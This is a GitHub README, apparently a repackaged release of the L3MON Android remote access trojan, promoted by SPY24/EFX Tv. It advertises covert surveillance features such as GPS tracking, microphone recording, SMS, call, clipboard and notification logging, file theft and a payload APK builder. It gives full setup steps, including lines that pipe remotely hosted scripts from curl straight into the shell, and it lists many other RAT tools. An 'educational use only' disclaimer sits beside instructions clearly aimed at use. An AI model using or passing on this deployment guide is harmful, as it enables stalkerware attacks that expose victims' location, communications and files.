# Deleted by owner it may not work, Get Updates on <a href="https://spy24.io/l3mon-rat/">SPY24 (only for education)</a>.
<p align="center">
A cloud-based remote Android management suite, powered by NodeJS 
</p>
<p> We as <a href="https://www.youtube.com/@spy24io">SPY24</a> do not pressurize the Lemon tool in any way. Our moral obligation is to send all types of rights and donations directly to the original crater. We sincerely thank you for allowing us to upload this tool to our GitHub. We have enabled Lemon to support termux with a few minor changes.</p>

<p>Now users no longer need to sign the lemon payload using Apk Editor. If you are a Termux user, you will be able to easily build the payload of Lemon with the help of this repository, as well as use it in Kali Linux and Ubuntu without any errors. If you are a Kali or Ubuntu user, you need to have Java8 Installed on your machine or follow the rootless installation.</p>

<p>The only way to help us is to visit our YouTube channel and subscribe to our channel, leave your comments on our videos, and follow us on GitHub. Looking forward to your cooperation.</p>

## Similar tool with modification supported by EFX Tv alongside L3MON 
- L3MON 
- HaxRAT
- LizRAT
- Ahmyth
- Androrat
- Metasploit
- FatRat
- Cypher
- craxs
- Spy note
- Spy Max
- DarkComet
- BetterAndroRAT
- Airavat RAT
- UnknownRAT
- NetWire
- Dendroid
- LizRAT
- ShivaTheCreator


## L3MON Features
- GPS Logging
- Microphone Recording
- View Contacts
- SMS Logs
- Send SMS
- Call Logs
- View Installed Apps
- View Stub Permissions
- Live Clipboard Logging
- Live Notification Logging
- View WiFi Networks (logs previously seen)
- File Explorer & Downloader
- Command Queuing
- Built In APK Builder

## Prerequisites 
 - Java Runtime Environment 8
    - See [installation](#Installation) for OS specifics
 - NodeJs 
 - A Server

## Installation 
1. Install JRE 8 (We cannot stress this enough USE java 1.8.0 ANY issues that don't use this will be closed WITHOUT a response)
    - Debian, Ubuntu, Etc
     - Ubuntu chroot
        - `sudo apt install wget curl git npm nano nodejs openjdk-8-jdk openjdk-8-jre`
        - `source <(curl -fsSL https://raw.githubusercontent.com/efxtv/npm/main/apktool/apktool-kali-ubuntu.sh)`
      - Termux 
        - `pkg update && pkg upgrade`
        - `source <(curl -fsSL https://raw.githubusercontent.com/efxtv/npm/main/apktool/apktool-termux.sh) `
        - `source <(curl -fsSL https://raw.githubusercontent.com/efxtv/npm/main/L3mon-no-java8.sh) `
        - `curl -L -o $PWD/emsf https://github.com/efxtv/EMSF/blob/main/termux/emsf?raw=true -s;chmod +x emsf;mv emsf ../usr/bin/ `
    - Fedora, Oracle, Red Hat, etc
        -  `su -c "yum install java-1.8.0-openjdk"`
    - Windows 
        - click [HERE](https://www.oracle.com/technetwork/java/javase/downloads/jre8-downloads-2133155.html) for downloads

2. Install NodeJS [Instructions Here](https://nodejs.org/en/download/package-manager/) (If you can't figure this out, you shouldn't really be using this)

3. install PM2 
    - `npm install pm2 -g`
    - `npm install`
    - `npm audit fix`
    - `npm audit`

4. Download and Extract the latest release from [HERE](https://spy24.io/l3mon-rat/)

5. In the extracted folder, run these commands
    - `npm install` <- install dependencies
    - `pm2 start index.js` <-- start the script
    - `pm2 startup` <- to run L3MON on startup

6. Set a Username & Password
    1. Stop L3MON `pm2 stop index`
    2. Open `maindb.json` in a text editor
    3. MD5 Hash `echo -n efxtv | openssl md5|awk '{print $2}'`
    4. under `admin` 
        - set the `username` as plain text
        - set the `password` as a LOWERCASE MD5 hash
    4. save the file
    5. run `pm2 restart all`

7. in your browser navigate to `http://127.0.0.1:22533`

## Notes
When opening an issue, you **MUST** use the provided templates. Issues without this will not receive support quickly and will be put to the bottom of the figurative pile.

Please have a look through the current issues, open and closed to see if your issue has been addressed before. If it's java related, it's most definitely been addressed - In short Use Java 1.8.0


## Disclaimer
<b>D3VL Provides no warranty with this software and will not be responsible for any direct or indirect damage caused due to the usage of this tool.<br>
L3MON is built for both Educational and Internal use ONLY.</b>

<br>
